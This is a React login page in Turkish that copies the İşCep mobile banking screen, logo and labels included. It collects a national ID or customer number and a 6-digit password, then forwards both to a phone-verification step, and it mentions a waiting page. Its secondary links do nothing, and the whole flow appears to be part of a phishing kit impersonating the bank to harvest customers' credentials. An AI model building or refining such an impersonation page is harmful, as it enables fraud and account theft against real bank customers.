import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import './App.css';
import { AuthProvider, useAuth } from './AuthContext';
import { useScroll } from './ScrollContext';

const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);

function LoginPageContent() {
  const { state, dispatch } = useAuth();
  const { inputValue = '', passwordValue = '' } = state || {};
  const passwordInputRef = useRef(null);
  const tcInputRef = useRef(null);
  const navigate = useNavigate();
  const location = useLocation();
  const { rightSectionRef, handleInputFocus } = useScroll();
  const hasScrolledRef = useRef(false); // Tekrarlanan kaydırmayı önlemek için bayrak

  const [localState, setLocalState] = React.useState({
    isTcActive: inputValue.length > 0,
    isActive: inputValue.length === 11,
    isTcBold: inputValue.length > 0,
    showTcError: false,
  });

  // Sayfa yüklendiğinde veya geri dönüldüğünde scroll'u en üste kaydır
  useEffect(() => {
    const scrollToTop = () => {
      if (rightSectionRef.current) {
        rightSectionRef.current.scrollTop = 0;
        rightSectionRef.current.dataset.loaded = 'true';
      } else {
        setTimeout(scrollToTop, 100);
      }
    };

    setTimeout(() => {
      requestAnimationFrame(scrollToTop);
    }, 200);
  }, [rightSectionRef, location.state]);

  // Handle navigation from WaitingPage or PhoneVerification
  useEffect(() => {
    if (location.state?.fromPhoneVerification || location.state?.fromWaitingPage) {
      dispatch({ type: 'RESET_AUTH' });
      setLocalState({
        isTcActive: false,
        isActive: false,
        isTcBold: false,
        showTcError: false,
      });
    }
  }, [location.state, dispatch]);

  // Sync localState with inputValue
  useEffect(() => {
    setLocalState((prev) => ({
      ...prev,
      isTcActive: prev.isTcActive || inputValue.length > 0, // isTcActive true kalır
      isTcBold: inputValue.length > 0, // Metin varsa kalın, yoksa ince
      showTcError: false,
      isActive: inputValue.length === 11,
    }));
    // inputValue değiştiğinde bayrağı sıfırla
    hasScrolledRef.current = false;
  }, [inputValue]);

  // TC inputu 11 haneye ulaştığında kaydır ve şifre inputuna odaklan
  useEffect(() => {
    if (inputValue.length === 11 && passwordInputRef.current && rightSectionRef.current && !hasScrolledRef.current) {
      setTimeout(() => {
        if (rightSectionRef.current && passwordInputRef.current) {
          handleInputFocus(passwordInputRef, 150); // Sabit scrollTo: 150
          setLocalState((prev) => ({ ...prev, isActive: true }));
          passwordInputRef.current.focus(); // Otomatik odaklanma
          hasScrolledRef.current = true; // Bayrağı işaretle
        }
      }, 200);
    }
  }, [inputValue, handleInputFocus, rightSectionRef, passwordInputRef]);

  // Sanal klavye ve viewport ayarları
  useEffect(() => {
    const meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content =
      'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-visual';
    document.head.appendChild(meta);

    if (!isIOS() && 'virtualKeyboard' in navigator) {
      navigator.virtualKeyboard.overlaysContent = true;
      const handleKeyboardGeometryChange = () => {
        const kbHeight = navigator.virtualKeyboard.boundingRect.height;
        document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
        if (rightSectionRef.current) {
          rightSectionRef.current.style.paddingBottom = `${kbHeight + 150}px`;
        }
      };
      navigator.virtualKeyboard.addEventListener('geometrychange', handleKeyboardGeometryChange);
      return () => {
        navigator.virtualKeyboard.removeEventListener('geometrychange', handleKeyboardGeometryChange);
        document.head.removeChild(meta);
      };
    } else if (isIOS()) {
      if (rightSectionRef.current) {
        rightSectionRef.current.style.paddingBottom = '200px';
      }
      return () => {
        document.head.removeChild(meta);
      };
    }
  }, [rightSectionRef]);

  const handleNumberInput = useCallback(
    (e, type, maxLength) => {
      const value = e.target.value;
      if (/^\d*$/.test(value) && value.length <= maxLength) {
        dispatch({ type, payload: value });
        setLocalState((prev) => ({
          ...prev,
          ...(type === 'SET_INPUT_VALUE'
            ? { isTcActive: true, isTcBold: value.length > 0, showTcError: false }
            : { isActive: true, showTcError: false }),
        }));
      }
    },
    [dispatch]
  );

  const handleTcKeyDown = useCallback((e) => {
    if ((e.key === 'Backspace' || e.key === 'Delete') && !e.target.value) {
      setLocalState((prev) => ({
        ...prev,
        isTcActive: true, // Label üstte kalsın
        isTcBold: false, // Label kalın olmasın
      }));
    }
  }, []);

  const handleClearTc = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_TC' });
      setLocalState((prev) => ({
        ...prev,
        isTcActive: true, // Label üstte kalsın
        isTcBold: false, // Label kalın olmasın
        showTcError: false,
      }));
      tcInputRef.current?.focus();
    },
    [dispatch]
  );

  const handleClearPassword = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_PASSWORD' });
      setLocalState((prev) => ({ ...prev, isActive: true, showTcError: false }));
      passwordInputRef.current?.focus();
      handleInputFocus(passwordInputRef, 150); // Sabit scrollTo: 150
    },
    [dispatch, handleInputFocus]
  );

  const handleTcFocus = useCallback(() => {
    setLocalState((prev) => ({
      ...prev,
      isTcActive: true,
      isTcBold: inputValue.length > 0, // Metin varsa kalın, yoksa ince
    }));
    // Şifre inputu açıkken TC inputuna odaklanıldığında biraz yukarı kaydır
    if (inputValue.length === 11 && rightSectionRef.current && tcInputRef.current) {
      handleInputFocus(tcInputRef, 50); // Sabit scrollTo: 50
    }
  }, [inputValue, handleInputFocus, rightSectionRef, tcInputRef]);

  const handleTcBlur = useCallback(() => {
    if (!inputValue.length) {
      setLocalState((prev) => ({
        ...prev,
        isTcActive: false, // Boşsa ve blur olursa label içeri dönsün
        isTcBold: false, // Boşsa ve blur olursa label içeri dönsün
      }));
    }
  }, [inputValue]);

  const handlePasswordFocus = useCallback(() => {
    setLocalState((prev) => ({ ...prev, isActive: true }));
    handleInputFocus(passwordInputRef, 150); // Sabit scrollTo: 150, her zaman kaydır
  }, [handleInputFocus]);

  const handlePasswordBlur = useCallback(
    (e) => {
      const isClearButton = e.relatedTarget?.classList.contains('clear-password-button');
      if (!passwordValue.length && !isClearButton) {
        setLocalState((prev) => ({ ...prev, isActive: false }));
      }
    },
    [passwordValue]
  );

  const handleContinueClick = useCallback(() => {
    if (inputValue.length > 0 && inputValue.length !== 11) {
      setLocalState((prev) => ({ ...prev, showTcError: true }));
      return;
    }
    if (inputValue.length === 11 && passwordValue.length === 6) {
      navigate('/telefon', {
        state: { tc: inputValue, password: passwordValue, isValidNavigation: true },
        replace: true,
      });
    }
  }, [inputValue, passwordValue, navigate]);

  const handleFormSubmit = useCallback(
    (e) => {
      e.preventDefault();
      e.stopPropagation();
      handleContinueClick();
      if (document.activeElement) {
        document.activeElement.blur();
      }
    },
    [handleContinueClick]
  );

  return (
    <form onSubmit={handleFormSubmit} style={{ touchAction: 'manipulation' }}>
      <div className="container">
        <div className="right-section" ref={rightSectionRef}>
          <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo" loading="lazy" />
          <div className="user-icon">
            <img src="/user.png" alt="Kullanıcı Simgesi" loading="lazy" />
          </div>
          <div className="new-container">
            Yeni Kullanıcı
            <div className="down-arrow">
              <img src="/down-arrow.png" alt="Aşağı Ok" className="down-arrow-img" loading="lazy" />
            </div>
          </div>
          <div className="new-lower-container">Bireysel</div>
          <div className="input-wrapper">
            <div
              className={`tc-input-wrapper ${localState.showTcError ? 'error' : ''}`}
              onClick={() => tcInputRef.current?.focus()}
            >
              <label
                className={`tc-label ${localState.isTcActive ? 'hovered' : ''}`}
                htmlFor="tc-input"
              >
                Müşteri Numarası /{' '}
                <span className={`tc-label-part ${localState.isTcBold ? 'bold' : ''}`}>
                  TCKN-YKN
                </span>
              </label>
              <input
                id="tc-input"
                ref={tcInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="11"
                value={inputValue}
                onChange={(e) => handleNumberInput(e, 'SET_INPUT_VALUE', 11)}
                onFocus={handleTcFocus}
                onBlur={handleTcBlur}
                onKeyDown={handleTcKeyDown}
                className={`new-input tc-input ${localState.showTcError ? 'error' : ''}`}
                autoComplete="off"
                autoCapitalize="none"
                aria-describedby="tc-error"
                aria-label="Müşteri Numarası veya TCKN-YKN"
              />
              {inputValue.length > 0 && (
                <button
                  className="clear-tc-button"
                  type="button"
                  onClick={handleClearTc}
                  onTouchStart={handleClearTc}
                  aria-label="TCKN-YKN’yi temizle"
                >
                  ✕
                </button>
              )}
              {localState.showTcError && (
                <div id="tc-error" className="tc-error" role="alert" aria-live="assertive">
                  <img
                    src="/error.png"
                    alt="Hata Simgesi"
                    className="error-icon"
                    loading="lazy"
                    onError={() => {}}
                  />
                  Hatalı giriş yaptınız, lütfen tekrar deneyiniz.
                </div>
              )}
            </div>
            <div
              className={`action-links ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
            >
              <button
                className="action-link become-customer"
                type="button"
                onClick={() => {}}
              >
                MÜŞTERİ OLMAK İSTİYORUM
              </button>
              <button
                className="action-link create-password"
                type="button"
                onClick={() => {}}
              >
                ŞİFRE OLUŞTUR
              </button>
            </div>
            {inputValue.length === 11 && (
              <div className="password-input-wrapper">
                <label
                  className={`password-label ${localState.isActive ? 'hovered' : ''}`}
                  htmlFor="password-input"
                >
                  Şifre
                </label>
                <div className="password-input-container">
                  <input
                    id="password-input"
                    ref={passwordInputRef}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength="6"
                    value={passwordValue}
                    onChange={(e) => handleNumberInput(e, 'SET_PASSWORD_VALUE', 6)}
                    onFocus={handlePasswordFocus}
                    onBlur={handlePasswordBlur}
                    className={`new-input password-input ${
                      inputValue.length === 11 ? 'no-right-line' : ''
                    }`}
                    autoComplete="new-password"
                    autoCapitalize="none"
                    aria-describedby="password-error"
                    aria-label="Şifre"
                  />
                  {passwordValue.length > 0 && (
                    <button
                      className="clear-password-button"
                      type="button"
                      onClick={handleClearPassword}
                      onTouchStart={handleClearPassword}
                      aria-label="Şifreyi temizle"
                    >
                      ✕
                    </button>
                  )}
                </div>
                {(passwordValue.length > 0 || localState.isActive) && (
                  <div className="password-overlay">
                    <span className="dots">
                      {[...Array(6)].map((_, index) => (
                        <span
                          key={index}
                          className={`dot ${index < passwordValue.length ? '' : 'inactive'}`}
                        />
                      ))}
                    </span>
                  </div>
                )}
              </div>
            )}
            <button
              type="submit"
              className={`continue-button ${
                inputValue.length > 0 &&
                (inputValue.length < 11 || (inputValue.length === 11 && passwordValue.length === 6))
                  ? 'active-continue-button'
                  : ''
              } ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
              onClick={handleContinueClick}
              disabled={inputValue.length === 0 || (inputValue.length === 11 && passwordValue.length !== 6)}
              aria-label="Devam et"
            >
              Devam
            </button>
          </div>
          <div style={{ height: '135vh', width: '100%' }}></div>
        </div>
      </div>
    </form>
  );
}

function LoginPage() {
  return (
    <AuthProvider>
      <LoginPageContent />
    </AuthProvider>
  );
}

export default memo(LoginPage);
